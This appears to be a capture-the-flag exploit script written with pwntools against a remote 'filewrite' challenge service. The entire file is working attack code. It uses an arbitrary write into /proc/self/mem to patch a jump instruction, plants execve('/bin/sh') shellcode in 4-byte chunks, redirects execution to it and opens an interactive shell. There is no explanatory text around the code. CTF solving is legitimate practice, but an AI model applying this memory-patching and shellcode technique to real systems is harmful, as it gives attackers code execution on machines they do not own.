from pwn import *

# context.binary = elf = ELF("./chal")

# p = elf.process()
p = remote("filewrite.ctf.ingeniums.club", 1337, ssl=True)
assert p

p.sendlineafter(b"name: ", b"/proc/self/mem")

p.sendlineafter(b"to: ", str(0x401375).encode())

sc = u32(b"\xe9\x18\xff\xff")
p.sendlineafter(b"write: ", str(sc).encode())

shellcode = bytes.fromhex("48b82f62696e2f7368009950545f525e6a3b580f05")
chunked = [
    u32(shellcode[i : i + 4].ljust(4, b"\x90")) for i in range(0, len(shellcode), 4)
]

scaddr = 0x40137A

for i, sc in enumerate(chunked):
    pause(1)
    p.sendline(str(scaddr + i * 4).encode())
    p.sendlineafter(b"write: ", str(sc).encode())

pause(1)
p.sendline(str(0x401375).encode())
sc = u32(b"\xeb\x03\x90\x90")
# gdb.attach(p)
p.sendlineafter(b"write: ", str(sc).encode())

p.interactive()
